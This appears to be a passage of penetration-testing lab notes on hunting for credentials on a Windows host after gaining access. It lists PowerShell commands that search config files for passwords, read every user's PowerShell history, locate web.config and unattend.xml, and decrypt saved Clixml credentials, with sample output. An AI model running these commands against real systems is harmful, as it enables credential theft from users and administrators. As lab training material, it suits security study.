## Searching for Files
```
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
Sensitive IIS information such as credentials may be stored in a web.config file. For the default IIS website, this could be located at C:\inetpub\wwwroot\web.config
## Chrome Dictionary Files
```
PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```
## Unattended Installation Files
Passwords in the unattend.xml are stored in plaintext or base64 encoded.
## PowerShell History File
```
C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt.
```
### Confirming PowerShell History Save Path
```
PS C:\htb> (Get-PSReadLineOption).HistorySavePath
```
### Reading PowerShell History File
```
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath
```
We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user. This can also be extremely helpful as a post-exploitation step. We should always recheck these files once we have local admin if our prior access did not allow us to read the files for some users. This command assumes that the default save path is being used.
```
PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
## PowerShell Credentials
for example, the following script Connect-VC.ps1, which a sysadmin has created to connect to a vCenter server easily.
### Decrypting PowerShell Credentials
```
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```
```
PS C:\htb> $credential.GetNetworkCredential().username
```
```
bob
```
```
PS C:\htb> $credential.GetNetworkCredential().password
```
```
Str0ng3ncryptedP@ss!
```